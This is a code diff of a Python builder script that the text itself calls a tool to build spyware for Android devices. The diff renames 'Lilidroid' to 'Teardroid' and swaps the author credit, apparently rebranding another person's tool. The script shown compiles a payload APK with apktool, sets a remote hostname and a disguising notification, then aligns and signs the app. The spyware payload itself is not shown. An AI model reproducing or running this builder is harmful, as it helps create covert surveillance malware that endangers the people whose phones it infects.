@@ -1,5 +1,5 @@
-# Author : script1337 [script@hacksec.in]
-# Website : https://www.hacksec.in
+# Author : Voytho
+# Website : https://
 # Date : Wednesday, 26 January 2022
 # Time : 04:04 AM
 
@@ -10,7 +10,7 @@ import argparse
 import sys
 import os
 from time import sleep
-from Builder import Lilidroid as LilidroidBuilder
+from Builder import Teardroid as TeardroidBuilder
 from colorama import Fore, Style
 
 
@@ -22,14 +22,14 @@ class Config(BaseModel):
 
 config = Config()
 parser = argparse.ArgumentParser(
-    description='Lilidroid v4.0 - A tool to build lilidroid spyware for Android devices.')
+    description='Lilidroid v4.0 - A tool to build teardroid spyware for Android devices.')
 
 
-parser.add_argument('-v', '--version', help='Version of Lilidroid',
+parser.add_argument('-v', '--version', help='Version of Teardroid',
                     action='version', version=config.version)
 
 parser.add_argument(
-    '-b', '--build', help='Build Lilidroid with custom name [ex: Lilidroid.py -b lilidroid]', metavar='')
+    '-b', '--build', help='Build Teardroid with custom name [ex: Lilidroid.py -b teardroid]', metavar='')
 
 
 def banner() -> Str:
@@ -46,21 +46,21 @@ def builder(name: str) -> None:
     except:
         sys.exit(0)
         print("GoodBye")
-    Lilidroid = LilidroidBuilder(name)
-    Lilidroid.changeAppname()
-    Lilidroid.changeHostname(url)
-    Lilidroid.changeNotification(
+    Teardroid = TeardroidBuilder(name)
+    Teardroid.changeAppname()
+    Teardroid.changeHostname(url)
+    Teardroid.changeNotification(
         NotificationText, NotificationContent, NotificationSubText)
-    Lilidroid.print_result("Compiling Lilidroid using apktool")
-    os.system("./apktool.sh b Lilidroid_Payload -o " + name + "_uncompressed.apk")
-    Lilidroid.print_result("Compiling Lilidroid completed")
-    Lilidroid.print_result("Compressing APK Files using zipalign")
-    Lilidroid.CompressAPK()
-    Lilidroid.print_result("Signing Lilidroid")
-    Lilidroid.SingAPK()
-    Lilidroid.Clear()
-    Lilidroid.print_result("Proccess Completed Successfully")
-    Lilidroid.print_result("Saved as " + os.getcwd() + "/" + name + ".apk")
+    Teardroid.print_result("Compiling Teardroid using apktool")
+    os.system("./apktool.sh b Teardroid_Payload -o " + name + "_uncompressed.apk")
+    Teardroid.print_result("Compiling Teardroid completed")
+    Teardroid.print_result("Compressing APK Files using zipalign")
+    Teardroid.CompressAPK()
+    Teardroid.print_result("Signing Teardroid")
+    Teardroid.SingAPK()
+    Teardroid.Clear()
+    Teardroid.print_result("Proccess Completed Successfully")
+    Teardroid.print_result("Saved as " + os.getcwd() + "/" + name + ".apk")
 
 
 if __name__ == '__main__':
